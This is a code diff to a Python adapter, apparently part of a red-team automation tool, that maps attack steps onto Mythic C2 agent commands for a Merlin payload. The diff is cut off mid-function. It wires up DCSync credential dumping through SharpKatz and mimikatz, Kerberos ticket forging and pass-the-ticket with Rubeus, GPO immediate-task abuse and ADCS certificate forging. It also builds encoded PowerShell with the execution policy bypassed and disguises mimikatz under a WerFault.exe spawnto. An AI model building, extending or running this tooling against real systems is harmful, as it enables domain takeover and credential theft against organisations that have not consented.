@@ -6,8 +6,147 @@ that turns those operations into Mythic command names and parameter schemas.
 """
 
 import base64
-from dataclasses import dataclass, field
+from dataclasses import dataclass, field, replace
 from typing import Any
+
+try:
+    from . import operation_providers
+except ImportError:
+    import operation_providers
+
+
+# Merlin's one-step registered-file .NET surface is execute-assembly. Operations
+# that must mutate the agent's own logon session use the explicit
+# load-assembly -> invoke-assembly in-process provider instead. Merlin's Donut
+# transport truncates long execute-assembly arguments, so fail closed when a
+# one-step command would exceed that transport limit. Runtime materializers may
+# compact generated artifact paths before translation when the payload profile
+# declares that as a safe way to stay under budget.
+MERLIN_MYTHIC_ADAPTER: dict[str, Any] = {
+    "payload_type": "merlin",
+    "dotnet_runner_command": "execute-assembly",
+    "dotnet_tool_param": "filename",
+    "dotnet_args_param": "arguments",
+    "dotnet_runner_max_argument_bytes": 255,
+    "adcs_certificate_auth_compact_remote_paths": True,
+    "adcs_certificate_auth_compact_ca_pfx_path": r".\c",
+    "adcs_certificate_auth_compact_forged_pfx_path": r".\f",
+    "certificate_forge_omit_subject": True,
+    "inprocess_dotnet_load_command": "load-assembly",
+    "inprocess_dotnet_load_tool_param": "filename",
+    "inprocess_dotnet_invoke_command": "invoke-assembly",
+    "inprocess_dotnet_invoke_tool_param": "assembly",
+    "inprocess_dotnet_invoke_args_param": "arguments",
+    "drsuapi_command": "",
+    "drsuapi_inprocess_load_command": "load-assembly",
+    "drsuapi_inprocess_invoke_command": "invoke-assembly",
+    "dcsync_tool": "SharpKatz.exe",
+    "mimikatz_command": "mimikatz",
+    "mimikatz_arguments_param": "arguments",
+    "mimikatz_quote_command": True,
+    "mimikatz_parameters": {
+        "spawnto": r"C:\Windows\System32\WerFault.exe",
+    },
+    "powershell_command": "run",
+    "run_executable_param": "executable",
+    "run_arguments_param": "arguments",
+    # Merlin's shell TaskFunctionParseArgString expects JSON, so shell commands must
+    # use its structured `arguments` parameter instead of Apollo-style raw text.
+    "shell_raw_parameters": False,
+    "shell_arguments_param": "arguments",
+    "structured_artifact_read_command": "run",
+    "structured_artifact_read_executable": "more.com",
+    # Merlin's run/shell task bridge splits arguments on literal spaces before the
+    # agent receives them. Prefer the quote-free native `net user` proof under run;
+    # callers that truly need a quote-bearing command can opt into encoded PowerShell
+    # under run rather than adding a cmd.exe shell process.
+    "gpo_membership_proof_mode": "net-user",
+    "gpo_membership_proof_transport": "run",
+    "gpo_membership_proof_command": "run",
+    "gpo_membership_proof_executable": "net.exe",
+    "current_ticket_list_command": "run",
+    "current_ticket_list_executable": "klist.exe",
+    "current_ticket_list_arguments": "",
+    "current_ticket_purge_command": "run",
+    "current_ticket_purge_executable": "klist.exe",
+    "current_ticket_purge_arguments": "purge",
+    "current_service_ticket_command": "run",
+    "current_service_ticket_executable": "klist.exe",
+    # Merlin applies its stored make_token token around later commands. Once that
+    # token exists, in-process Rubeus PTT and klist operate in that isolated
+    # logon session even though their underlying provider semantics are current
+    # session operations.
+    "logon_session_mode": "direct",
+    "logon_username_param": "user",
+    "logon_password_param": "pass",
+    "logon_netonly_param": "",
+    "operation_provider_extra_contexts": {
+        "managed-rubeus-ptt": ["isolated"],
+        "managed-rubeus-klist": ["isolated"],
+    },
+    # A process-backed PowerShell query loses Merlin's applied make_token token.
+    # Keep managed-secret reads in-process so SharpView runs under Setup()/TearDown().
+    "managed_secret_inprocess_load_command": "load-assembly",
+    "managed_secret_inprocess_invoke_command": "invoke-assembly",
+    "managed_secret_read_tool": "SharpView.exe",
+    # Merlin has no Apollo-style ticket_cache_* or ticket_store_* commands. Let
+    # the operation-provider layer choose Rubeus ptt or klist rather than
+    # emitting a command that only exists on another payload.
+    "current_ticket_import_command": "",
+    "current_ticket_cache_list_command": "",
+    "current_ticket_cache_purge_command": "",
+    "ticket_import_command": "",
+    "ticket_list_command": "",
+    "ticket_purge_command": "",
+    "service_access_command": "ls",
+    "service_access_path_param": "path",
+    "upload_command": "upload",
+    "tool_upload_command": "upload",
+    # Merlin's File parameter group is for a new inline upload. Passing an existing
+    # Mythic UUID there creates a zero-byte target file; registered artifacts must
+    # use the Default-group filename selector instead.
+    "upload_file_param": "file",
+    "upload_path_param": "path",
+    "upload_registered_file_param": "filename",
+    "upload_registered_file_value": "filename",
+    "collection_identity_command": "token",
+    "collection_identity_parameters": {"method": "whoami"},
+    "collection_identity_parser": "merlin-token",
+    # Merlin exposes token identity/LUID state but no Apollo-style ticket_cache_list
+    # command. Baseline collection only needs a domain-capable token proof.
+    "collection_ticket_command": "",
+    "collection_revert_command": "rev2Self",
+    "collection_download_path_param": "file",
+    # Merlin's `run` child-process path inherits any stored make_token token.
+    # Use explicit PSCredential WMI for local-admin remote exec and clear stale
+    # stored tokens first so process creation runs under the original context.
+    "local_admin_remote_exec_command": "run",
+    "native_remote_exec_method": "powershell-wmi",
+    "explicit_credential_remote_exec_reset_command": "rev2Self",
+    "remote_file_read_command": "download",
+    "remote_file_read_path_param": "file",
+    "suppress_remote_file_read": True,
+}
+
+_PAYLOAD_TYPE_ADAPTERS: dict[str, dict[str, Any]] = {
+    "merlin": MERLIN_MYTHIC_ADAPTER,
+}
+
+_COLLECTION_PAYLOAD_TYPE_ADAPTERS: dict[str, dict[str, Any]] = {
+    "apollo": {},
+    "merlin": MERLIN_MYTHIC_ADAPTER,
+}
+
+
+def adapter_config_for_payload_type(payload_type: Any) -> dict[str, Any]:
+    """Return a copy of the command-schema profile for a Mythic payload type."""
+    return dict(_PAYLOAD_TYPE_ADAPTERS.get(_normalize(payload_type), {}))
+
+
+def collection_adapter_for_payload_type(payload_type: Any) -> dict[str, Any] | None:
+    """Return a collector command profile, or None when collection is unsupported."""
+    profile = _COLLECTION_PAYLOAD_TYPE_ADAPTERS.get(_normalize(payload_type))
+    return dict(profile) if isinstance(profile, dict) else None
 
 
 @dataclass(frozen=True)
@@ -17,6 +156,7 @@ class MythicCapabilityCommand:
     capability: str
     purpose: str
     expected_probe: str
+    operation: str = ""
     prerequisites: list[str] = field(default_factory=list)
     produces: list[str] = field(default_factory=list)
     consumes: list[str] = field(default_factory=list)
@@ -53,8 +193,13 @@ def build_mythic_capability_commands(
         translated = _translate_step(step, config)
         if not translated.ok:
             return translated
-        commands.extend(translated.commands)
-    return MythicCapabilityCommandPlan(True, commands=commands, reason="translated generic capability plan")
+        operation = _normalize(getattr(step, "operation", ""))
+        commands.extend(_commands_with_operation(translated.commands, operation))
+    return MythicCapabilityCommandPlan(
+        True,
+        commands=_dedupe_redundant_inprocess_setup_commands(commands, config),
+        reason="translated generic capability plan",
+    )
 
 
 def _translate_step(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
@@ -63,13 +208,7 @@ def _translate_step(step: Any, config: dict[str, Any]) -> MythicCapabilityComman
     if operation == "gpo-computer-task":
         plan = _dotnet_tool_command(step, config, _text(parameters.get("tool")), _sharp_gpo_task_args(parameters))
         if plan.ok and plan.commands:
-            return MythicCapabilityCommandPlan(
-                True,
-                commands=[
-                    _command_with_artifacts(plan.commands[0], produces=["artifact:gpo_immediate_task"]),
-                ],
-                reason=plan.reason,
-            )
+            return _plan_with_terminal_artifacts(plan, produces=["artifact:gpo_immediate_task"])
         return plan
     if operation == "structured-artifact-read":
         path = _text(parameters.get("path") or parameters.get("artifact_path"))
@@ -77,13 +216,7 @@ def _translate_step(step: Any, config: dict[str, Any]) -> MythicCapabilityComman
             return MythicCapabilityCommandPlan(False, missing=["path"], reason="structured artifact read needs path")
         artifact_type = _normalize(parameters.get("artifact_type") or parameters.get("format") or "structured")
         produces = [f"artifact:{artifact_type}_validated"] if artifact_type else ["artifact:structured_validated"]
-        return _shell_command(
-            step,
-            config,
-            "type " + _quote_cli(path),
-            consumes=["artifact:gpo_immediate_task"],
-            produces=produces,
-        )
+        return _structured_artifact_read_command(step, config, path, produces)
     if operation == "gpo-immediate-task-fallback":
         return _gpo_immediate_task_fallback_command(step, config, parameters)
     if operation == "gpo-refresh-local":
@@ -101,11 +234,66 @@ def _translate_step(step: Any, config: dict[str, Any]) -> MythicCapabilityComman
             ),
         ])
     if operation == "gpo-domain-admin-membership-proof":
+        principal = _text(parameters.get("principal"))
+        proof_mode = _normalize(config.get("gpo_membership_proof_mode"))
+        proof_command = 'net group "Domain Admins" /domain'
+        if proof_mode == "net-user" and principal:
+            proof_command = "net user " + _quote_cli(principal) + " /domain"
+        consumes = ["artifact:gpo_immediate_task", "event:group_policy_refresh"]
+        proof_transport = _normalize(config.get("gpo_membership_proof_transport"))
+        if proof_transport == "run":
+            executable = _adapter_text(config, "gpo_membership_proof_executable", "")
+            if not executable:
+                return MythicCapabilityCommandPlan(
+                    False,
+                    missing=["gpo_membership_proof_executable"],
+                    reason="run membership proof needs an executable",
+                )
+            if proof_mode == "net-user" and principal:
+                return _run_command(
+                    step,
+                    config,
+                    executable,
+                    "user " + _quote_cli(principal) + " /domain",
+                    command=_adapter_text(config, "gpo_membership_proof_command", "run"),
+                    consumes=consumes,
+                )
+            return MythicCapabilityCommandPlan(
+                False,
+                missing=["quote_free_membership_proof"],
+                reason="run membership proof needs a quote-free principal-scoped command",
+            )
+        if proof_transport == "powershell":
+            command = _adapter_text(
+                config,
+                "gpo_membership_proof_command",
+                _adapter_text(config, "powershell_command", "powerpick"),
+            )
+            if _normalize(command) == "run":
+                return _run_command(
+                    step,
+                    config,
+                    "powershell.exe",
+                    _powershell_encoded_args(proof_command),
+                    command=command,
+                    consumes=consumes,
+                )
+            if _normalize(command) == "shell":
+                return _shell_command(
+                    step,
+                    config,
+                    "powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand "
+                    + _ps_encoded_command(proof_command),
+                    consumes=consumes,
+                )
+            return MythicCapabilityCommandPlan(True, commands=[
+                _command_from_step(step, command, proof_command, consumes=consumes),
+            ])
         return _shell_command(
             step,
             config,
-            'net group "Domain Admins" /domain',
-            consumes=["artifact:gpo_immediate_task", "event:group_policy_refresh"],
+            proof_command,
+            consumes=consumes,
         )
     if operation == "gpo-proof-read":
         proof_path = _text(parameters.get("proof_path"))
@@ -155,6 +343,8 @@ def _translate_step(step: Any, config: dict[str, Any]) -> MythicCapabilityComman
         return _kerberos_ticket_list_command(step, config)
     if operation == "kerberos-ticket-purge":
         return _kerberos_ticket_purge_command(step, config)
+    if operation == "kerberos-service-ticket-acquire":
+        return _kerberos_service_ticket_acquire_command(step, config)
     if operation == "kerberos-context-service-proof":
         return _kerberos_context_service_proof_command(step, config)
     if operation == "ldap-managed-local-admin-secret-read":
@@ -208,6 +398,17 @@ def _dotnet_tool_command(
             missing=missing,
             reason="dotnet-tool Mythic adapter needs a runner command and tool name",
         )
+    argument_limit = _dotnet_runner_argument_limit(config)
+    argument_size = len(_text(tool_arguments).encode("utf-8"))
+    if argument_limit and argument_size > argument_limit:
+        return MythicCapabilityCommandPlan(
+            False,
+            missing=["dotnet_argument_transport"],
+            reason=(
+                "dotnet-tool arguments exceed the configured runner transport limit "
+                f"({argument_size}>{argument_limit})"
+            ),
+        )
     return MythicCapabilityCommandPlan(
         True,
         commands=[
@@ -232,12 +433,80 @@ def _shell_command(
     command_line: str,
     produces: list[str] | None = None,
     consumes: list[str] | None = None,
+    deferred: bool = False,
 ) -> MythicCapabilityCommandPlan:
     command = _adapter_text(config, "shell_command", "shell")
     if not command:
         return MythicCapabilityCommandPlan(False, missing=["shell_command"], reason="shell adapter needs a command")
+    parameters: Any = command_line
+    if _normalize(command) == "shell" and not _input_bool(config, "shell_raw_parameters", default=True):
+        parameters = {
+            _adapter_text(config, "shell_arguments_param", "arguments"): command_line,
+        }
     return MythicCapabilityCommandPlan(True, commands=[
-        _command_from_step(step, command, command_line, produces=produces, consumes=consumes),
+        _command_from_step(step, command, parameters, produces=produces, consumes=consumes, deferred=deferred),
+    ])
+
+
+def _structured_artifact_read_command(
+    step: Any,
+    config: dict[str, Any],
+    path: str,
+    produces: list[str],
+) -> MythicCapabilityCommandPlan:
+    provider = operation_providers.select_operation_provider(
+        "structured-artifact-read",
+        config=config,
+        context="current",
+    )
+    if (
+        provider is not None
+        and provider.name == "windows-more-structured-artifact-read"
+        and _normalize(provider.command) == "run"
+    ):
+        return _run_command(
+            step,
+            config,
+            provider.executable,
+            _quote_cli(path),
+            command=provider.command,
+            consumes=["artifact:gpo_immediate_task"],
+            produces=produces,
+        )
+    return _shell_command(
+        step,
+        config,
+        "type " + _quote_cli(path),
+        consumes=["artifact:gpo_immediate_task"],
+        produces=produces,
+    )
+
+
+def _run_command(
+    step: Any,
+    config: dict[str, Any],
+    executable: str,
+    arguments: str = "",
+    produces: list[str] | None = None,
+    consumes: list[str] | None = None,
+    command: str | None = None,
+    deferred: bool = False,
+) -> MythicCapabilityCommandPlan:
+    command_name = _text(command) or _adapter_text(config, "run_command", "run")
+    if not command_name:
+        return MythicCapabilityCommandPlan(False, missing=["run_command"], reason="run adapter needs a command")
+    return MythicCapabilityCommandPlan(True, commands=[
+        _command_from_step(
+            step,
+            command_name,
+            {
+                _adapter_text(config, "run_executable_param", "executable"): executable,
+                _adapter_text(config, "run_arguments_param", "arguments"): arguments,
+            },
+            produces=produces,
+            consumes=consumes,
+            deferred=deferred,
+        ),
     ])
 
 
@@ -298,27 +567,52 @@ def _drsuapi_dcsync_command(step: Any, config: dict[str, Any]) -> MythicCapabili
         return MythicCapabilityCommandPlan(False, missing=["domain"], reason="DCSync adapter needs a domain")
 
     executor = _normalize(parameters.get("executor") or config.get("executor"))
-    native_command = _adapter_text(config, "drsuapi_command", "dcsync")
-    if native_command and executor != "mimikatz":
-        native_account = _dcsync_user_qualifier(account, domain) if executor == "native" else account
-        mythic_parameters = {
-            _adapter_text(config, "drsuapi_domain_param", "domain"): domain,
-            _adapter_text(config, "drsuapi_user_param", "user"): native_account,
-        }
-        dc_param = _adapter_text(config, "drsuapi_dc_param", "dc")
-        if dc:
-            mythic_parameters[dc_param] = dc
-        return MythicCapabilityCommandPlan(True, commands=[
-            _command_from_step(step, native_command, mythic_parameters),
-        ])
+    if executor not in {"mimikatz", "native-mimikatz"}:
+        provider = operation_providers.select_operation_provider(
+            "drsuapi-dcsync",
+            config=config,
+            context="active-auth-context",
+        )
+        if provider is not None and provider.kind == "native":
+            native_account = _dcsync_user_qualifier(account, domain) if executor == "native" else account
+            mythic_parameters = {
+                _adapter_text(config, "drsuapi_domain_param", "domain"): domain,
+                _adapter_text(config, "drsuapi_user_param", "user"): native_account,
+            }
+            dc_param = _adapter_text(config, "drsuapi_dc_param", "dc")
+            if dc:
+                mythic_parameters[dc_param] = dc
+            return MythicCapabilityCommandPlan(True, commands=[
+                _command_from_step(step, provider.command, mythic_parameters),
+            ])
+        if provider is not None and provider.name == "managed-sharpkatz-dcsync":
+            translated = _inprocess_dotnet_tool_command(
+                step,
+                config,
+                provider,
+                provider.tool,
+                _sharpkatz_dcsync_args(domain, account, dc),
+            )
+            if not translated.ok:
+                return translated
+            if len(translated.commands) < 2:
+                return MythicCapabilityCommandPlan(
+                    False,
+                    missing=["inprocess_dotnet_commands"],
+                    reason="managed DCSync provider needs load and invoke commands",
+                )
+            return MythicCapabilityCommandPlan(True, commands=[
+                replace(translated.commands[0], expected_probe=""),
+                translated.commands[1],
+            ])
 
     mimikatz_command = _adapter_text(config, "mimikatz_command", "mimikatz")
     mimikatz_param = _adapter_text(config, "mimikatz_arguments_param", "commands")
     if not mimikatz_command:
         return MythicCapabilityCommandPlan(
             False,
-            missing=["drsuapi_command"],
-            reason="DCSync adapter needs a native DRSUAPI command or a Mimikatz fallback command",
+            missing=["drsuapi_provider"],
+            reason="DCSync adapter needs a DRSUAPI provider or a Mimikatz fallback command",
         )
     pieces = [
         "lsadump::dcsync",
@@ -329,7 +623,7 @@ def _drsuapi_dcsync_command(step: Any, config: dict[str, Any]) -> MythicCapabili
         pieces.append(f"/dc:{dc}")
     command_text = _mimikatz_command_argument(" ".join(pieces), config)
     return MythicCapabilityCommandPlan(True, commands=[
-        _command_from_step(step, mimikatz_command, {mimikatz_param: command_text}),
+        _command_from_step(step, mimikatz_command, _mimikatz_parameters(mimikatz_param, command_text, config)),
     ])
 
 
@@ -349,6 +643,17 @@ def _dcsync_user_qualifier(account: str, domain: str) -> str:
         return acct
     netbios = _netbios_from_domain(domain)
     return f"{netbios}\\{acct}" if netbios else acct
+
+
+def _sharpkatz_dcsync_args(domain: str, account: str, dc: str = "") -> str:
+    pieces = [
+        "--Command", "dcsync",
+        "--User", _quote_cli(_dcsync_user_qualifier(account, domain)),
+        "--Domain", _quote_cli(domain),
+    ]
+    if dc:
+        pieces.extend(["--DomainController", _quote_cli(dc)])
+    return " ".join(pieces)
 
 
 def _kerberos_ticket_forge_command(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
@@ -414,17 +719,17 @@ def _managed_kerberos_ticket_forge_command(
     command = _dotnet_tool_command(step, config, tool_name, " ".join(pieces))
     if not command.ok:
         return command
-    return MythicCapabilityCommandPlan(True, commands=[
-        _command_with_artifacts(command.commands[0], produces=["kerberos_ticket_base64"]),
-    ])
+    return _plan_with_terminal_artifacts(command, produces=["kerberos_ticket_base64"])
 
 
 def _kerberos_inter_realm_referral_command(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
-    """Map a generic TGS exchange to the payload's managed Kerberos command.
+    """Map an explicit TGS fallback exchange to the payload's managed Kerberos command.
 
-    Child-to-parent escalation invokes this twice: the child DC issues the parent referral, then the parent DC
-    exchanges that referral for the service ticket used by the proof operation. The latest ticket artifact
-    intentionally replaces the prior one for downstream import.
+    The normal cross-domain path lets Windows acquire referrals and service tickets from the imported current
+    session TGT. When a capability explicitly needs a standalone TGS artifact, this fallback runs twice: the
+    child DC issues the parent referral, then the parent DC exchanges that referral for the service ticket used
+    by the proof operation. The latest ticket artifact intentionally replaces the prior one for downstream
+    import.
     """
     parameters = getattr(step, "parameters", {}) if isinstance(getattr(step, "parameters", {}), dict) else {}
     target_domain = _text(
@@ -455,14 +760,12 @@ def _kerberos_inter_realm_referral_command(step: Any, config: dict[str, Any]) ->
     command = _dotnet_tool_command(step, config, tool_name, " ".join(pieces))
     if not command.ok:
         return command
-    return MythicCapabilityCommandPlan(True, commands=[
-        _command_with_artifacts(
-            command.commands[0],
-            consumes=["kerberos_ticket_base64"],
-            produces=["kerberos_ticket_base64"],
-            deferred=True,
-        ),
-    ])
+    return _plan_with_terminal_artifacts(
+        command,
+        consumes=["kerberos_ticket_base64"],
+        produces=["kerberos_ticket_base64"],
+        deferred=True,
+    )
 
 
 def _mimikatz_ticket_forge_command(
@@ -503,7 +806,7 @@ def _mimikatz_ticket_forge_command(
         _command_from_step(
             step,
             command,
-            {argument_param: command_text},
+            _mimikatz_parameters(argument_param, command_text, config),
             produces=["kerberos_ticket_file"],
         ),
     ])
@@ -554,9 +857,7 @@ def _kerberos_account_tgt_command(step: Any, config: dict[str, Any]) -> MythicCa
     command = _dotnet_tool_command(step, config, tool_name, " ".join(pieces))
     if not command.ok:
         return command
-    return MythicCapabilityCommandPlan(True, commands=[
-        _command_with_artifacts(command.commands[0], produces=["kerberos_ticket_base64"]),
-    ])
+    return _plan_with_terminal_artifacts(command, produces=["kerberos_ticket_base64"])
 
 
 def _certificate_pkinit_tgt_command(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
@@ -616,9 +917,10 @@ def _certificate_pkinit_tgt_command(step: Any, config: dict[str, Any]) -> Mythic
     command = _dotnet_tool_command(step, config, tool_name, " ".join(pieces))
     if not command.ok:
         return command
-    return MythicCapabilityCommandPlan(True, commands=[
-        _command_with_artifacts(command.commands[0], produces=["kerberos_ticket_base64", "certificate_pkinit_credentials"]),
-    ])
+    return _plan_with_terminal_artifacts(
+        command,
+        produces=["kerberos_ticket_base64", "certificate_pkinit_credentials"],
+    )
 
 
 def _certificate_schannel_ldap_proof_command(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
@@ -710,8 +1012,9 @@ def _kerberos_logon_session_create_command(step: Any, config: dict[str, Any]) ->
         mythic_parameters = {
             _adapter_text(config, "logon_username_param", "username"): username,
             _adapter_text(config, "logon_password_param", "password"): password,
-            netonly_param: bool(parameters.get("netonly", True)),
         }
+        if netonly_param:
+            mythic_parameters[netonly_param] = bool(parameters.get("netonly", True))
     else:
         mythic_parameters[credential_param] = {
             "account": user,
@@ -719,7 +1022,8 @@ def _kerberos_logon_session_create_command(step: Any, config: dict[str, Any]) ->
             "credential": password,
             "type": "plaintext",
         }
-        mythic_parameters[netonly_param] = bool(parameters.get("netonly", True))
+        if netonly_param:
+            mythic_parameters[netonly_param] = bool(parameters.get("netonly", True))
     process_param = _adapter_text(config, "logon_process_param", "")
     process = _text(parameters.get("process"))
     if process_param and process:
@@ -732,12 +1036,17 @@ def _kerberos_logon_session_create_command(step: Any, config: dict[str, Any]) ->
 def _kerberos_ticket_import_command(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
     parameters = getattr(step, "parameters", {}) if isinstance(getattr(step, "parameters", {}), dict) else {}
     agent_cache = _uses_agent_kerberos_cache(parameters)
-    if agent_cache:
-        command = _adapter_text(config, "current_ticket_import_command", "ticket_cache_add")
-    else:
-        command = _adapter_text(config, "ticket_import_command", "ticket_store_add")
-    if not command:
-        return MythicCapabilityCommandPlan(False, missing=["ticket_import_command"], reason="no ticket import command")
+    provider = operation_providers.select_operation_provider(
+        "kerberos-ticket-import",
+        config=config,
+        context="current-agent-cache" if agent_cache else "isolated",
+    )
+    if provider is None:
+        return MythicCapabilityCommandPlan(
+            False,
+            missing=["kerberos-ticket-import-provider"],
+            reason="no provider preserves the requested Kerberos ticket import context",
+        )
 
     ticket_value = _text(
         parameters.get("ticket_base64")
@@ -745,6 +1054,37 @@ def _kerberos_ticket_import_command(step: Any, config: dict[str, Any]) -> Mythic
         or parameters.get("ticket_artifact")
         or "{{kerberos_ticket_base64}}"
     )
+    if provider.name == "managed-rubeus-ptt":
+        translated = _inprocess_dotnet_tool_command(
+            step,
+            config,
+            provider,
+            provider.tool,
+            f"ptt /ticket:{_rubeus_value(ticket_value)}",
+        )
+        if not translated.ok:
+            return translated
+        if len(translated.commands) < 2:
+            return MythicCapabilityCommandPlan(
+                False,
+                missing=["inprocess_dotnet_commands"],
+                reason="managed current-session ticket import needs load and invoke commands",
+            )
+        return MythicCapabilityCommandPlan(True, commands=[
+            translated.commands[0],
+            _command_with_artifacts(
+                translated.commands[1],
+                consumes=(
+                    ["kerberos_ticket_base64"]
+                    if agent_cache else
+                    ["kerberos_ticket_base64", "kerberos_logon_context"]
+                ),
+                produces=["kerberos_ticket_imported"],
+                deferred="{{" in ticket_value,
+            ),
+        ])
+
+    command = provider.command
     domain = _text(parameters.get("domain"))
     user = _text(parameters.get("user") or "Administrator")
     mythic_parameters: dict[str, Any] = {
@@ -782,32 +1122,64 @@ def _kerberos_ticket_list_command(step: Any, config: dict[str, Any]) -> MythicCa
     target_context = _text(parameters.get("target_context"))
     current_context = _is_current_kerberos_context(target_context)
     agent_cache = _uses_agent_kerberos_cache(parameters)
-    if current_context and agent_cache:
-        command = _adapter_text(config, "current_ticket_cache_list_command", "ticket_cache_list")
-        if not command:
-            return MythicCapabilityCommandPlan(
-                False,
-                missing=["current_ticket_cache_list_command"],
-                reason="no agent-cache ticket-list command",
-            )
+    provider = operation_providers.select_operation_provider(
+        "kerberos-ticket-list",
+        config=config,
+        context=_kerberos_operation_context(current_context, agent_cache),
+    )
+    if provider is None:
+        return MythicCapabilityCommandPlan(
+            False,
+            missing=["kerberos-ticket-list-provider"],
+            reason="no provider preserves the requested Kerberos ticket-list context",
+        )
+    if provider.name == "native-current-ticket-cache-list":
         return MythicCapabilityCommandPlan(True, commands=[
             _command_from_step(
                 step,
-                command,
+                provider.command,
                 {"luid": "", "getSystemTickets": False},
                 consumes=["kerberos_ticket_imported"],
                 produces=["kerberos_context_inventory"],
             ),
         ])
-    if current_context:
-        command = _adapter_text(config, "current_ticket_list_command", "shell")
-        if not command:
+    if provider.name == "managed-rubeus-klist":
+        translated = _inprocess_dotnet_tool_command(
+            step,
+            config,
+            provider,
+            provider.tool,
+            provider.arguments or "klist",
+        )
+        if not translated.ok:
+            return translated
+        if len(translated.commands) < 2:
             return MythicCapabilityCommandPlan(
                 False,
-                missing=["current_ticket_list_command"],
-                reason="no current-context ticket-list command",
+                missing=["inprocess_dotnet_commands"],
+                reason="managed current-session ticket inventory needs load and invoke commands",
             )
-        raw_shell = command == "shell" and _input_bool(config, "current_ticket_list_raw_shell", default=True)
+        return MythicCapabilityCommandPlan(True, commands=[
+            translated.commands[0],
+            _command_with_artifacts(
+                translated.commands[1],
+                consumes=[] if current_context else ["kerberos_logon_context"],
+                produces=["kerberos_context_inventory"],
+            ),
+        ])
+    if provider.name == "windows-klist-list":
+        consumes = [] if current_context else ["kerberos_logon_context"]
+        if _normalize(provider.command) == "run":
+            return _run_command(
+                step,
+                config,
+                provider.executable,
+                provider.arguments,
+                command=provider.command,
+                consumes=consumes,
+                produces=["kerberos_context_inventory"],
+            )
+        raw_shell = _normalize(provider.command) == "shell" and _input_bool(config, "current_ticket_list_raw_shell", default=True)
         shell_command = _adapter_text(config, "current_ticket_list_shell", "klist")
         mythic_parameters: Any
         if raw_shell:
@@ -818,16 +1190,13 @@ def _kerberos_ticket_list_command(step: Any, config: dict[str, Any]) -> MythicCa
         return MythicCapabilityCommandPlan(True, commands=[
             _command_from_step(
                 step,
-                command,
+                provider.command,
                 mythic_parameters,
-                consumes=[],
+                consumes=consumes,
                 produces=["kerberos_context_inventory"],
             ),
         ])
 
-    command = _adapter_text(config, "ticket_list_command", "ticket_store_list")
-    if not command:
-        return MythicCapabilityCommandPlan(False, missing=["ticket_list_command"], reason="no ticket-list command")
     mythic_parameters: dict[str, Any] = {}
     luid_param = _adapter_text(config, "ticket_luid_param", "luid")
     if luid_param and target_context and not target_context.startswith("{{") and not current_context:
@@ -835,7 +1204,7 @@ def _kerberos_ticket_list_command(step: Any, config: dict[str, Any]) -> MythicCa
     elif luid_param and _input_bool(config, "ticket_list_emit_empty_luid", default=True):
         mythic_parameters[luid_param] = ""
     return MythicCapabilityCommandPlan(True, commands=[
-        _command_from_step(step, command, mythic_parameters, consumes=["kerberos_logon_context"]),
+        _command_from_step(step, provider.command, mythic_parameters, consumes=["kerberos_logon_context"]),
     ])
 
 
@@ -844,32 +1213,39 @@ def _kerberos_ticket_purge_command(step: Any, config: dict[str, Any]) -> MythicC
     target_context = _text(parameters.get("target_context"))
     current_context = _is_current_kerberos_context(target_context)
     agent_cache = _uses_agent_kerberos_cache(parameters)
-    if current_context and agent_cache:
-        command = _adapter_text(config, "current_ticket_cache_purge_command", "ticket_cache_purge")
-        if not command:
-            return MythicCapabilityCommandPlan(
-                False,
-                missing=["current_ticket_cache_purge_command"],
-                reason="no agent-cache ticket-purge command",
-            )
+    provider = operation_providers.select_operation_provider(
+        "kerberos-ticket-purge",
+        config=config,
+        context=_kerberos_operation_context(current_context, agent_cache),
+    )
+    if provider is None:
+        return MythicCapabilityCommandPlan(
+            False,
+            missing=["kerberos-ticket-purge-provider"],
+            reason="no provider preserves the requested Kerberos ticket-purge context",
+        )
+    if provider.name == "native-current-ticket-cache-purge":
         return MythicCapabilityCommandPlan(True, commands=[
             _command_from_step(
                 step,
-                command,
+                provider.command,
                 {"all": True, "serviceName": "", "luid": ""},
                 consumes=[],
                 produces=["kerberos_current_tickets_purged"],
             ),
         ])
-    if current_context:
-        command = _adapter_text(config, "current_ticket_purge_command", "shell")
-        if not command:
-            return MythicCapabilityCommandPlan(
-                False,
-                missing=["current_ticket_purge_command"],
-                reason="no current-context ticket-purge command",
+    if provider.name == "windows-klist-purge":
+        if _normalize(provider.command) == "run":
+            return _run_command(
+                step,
+                config,
+                provider.executable,
+                provider.arguments,
+                command=provider.command,
+                consumes=[],
+                produces=["kerberos_current_tickets_purged"],
             )
-        raw_shell = command == "shell" and _input_bool(config, "current_ticket_purge_raw_shell", default=True)
+        raw_shell = _normalize(provider.command) == "shell" and _input_bool(config, "current_ticket_purge_raw_shell", default=True)
         shell_command = _adapter_text(config, "current_ticket_purge_shell", "klist purge")
         mythic_parameters: Any
         if raw_shell:
@@ -880,16 +1256,13 @@ def _kerberos_ticket_purge_command(step: Any, config: dict[str, Any]) -> MythicC
         return MythicCapabilityCommandPlan(True, commands=[
             _command_from_step(
                 step,
-                command,
+                provider.command,
                 mythic_parameters,
                 consumes=[],
                 produces=["kerberos_current_tickets_purged"],
             ),
         ])
 
-    command = _adapter_text(config, "ticket_purge_command", "ticket_store_purge")
-    if not command:
-        return MythicCapabilityCommandPlan(False, missing=["ticket_purge_command"], reason="no ticket-purge command")
     mythic_parameters: dict[str, Any] = {}
     luid_param = _adapter_text(config, "ticket_luid_param", "luid")
     if luid_param and target_context and not target_context.startswith("{{") and not current_context:
@@ -899,12 +1272,77 @@ def _kerberos_ticket_purge_command(step: Any, config: dict[str, Any]) -> MythicC
     return MythicCapabilityCommandPlan(True, commands=[
         _command_from_step(
             step,
-            command,
+            provider.command,
             mythic_parameters,
             consumes=["kerberos_logon_context"],
             produces=["kerberos_ticket_store_purged"],
         ),
     ])
+
+
+def _kerberos_service_ticket_acquire_command(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
+    parameters = getattr(step, "parameters", {}) if isinstance(getattr(step, "parameters", {}), dict) else {}
+    target_context = _text(parameters.get("target_context"))
+    current_context = _is_current_kerberos_context(target_context)
+    agent_cache = _uses_agent_kerberos_cache(parameters)
+    provider = operation_providers.select_operation_provider(
+        "kerberos-service-ticket-acquire",
+        config=config,
+        context=_kerberos_operation_context(current_context, agent_cache),
+    )
+    if provider is None:
+        return MythicCapabilityCommandPlan(
+            False,
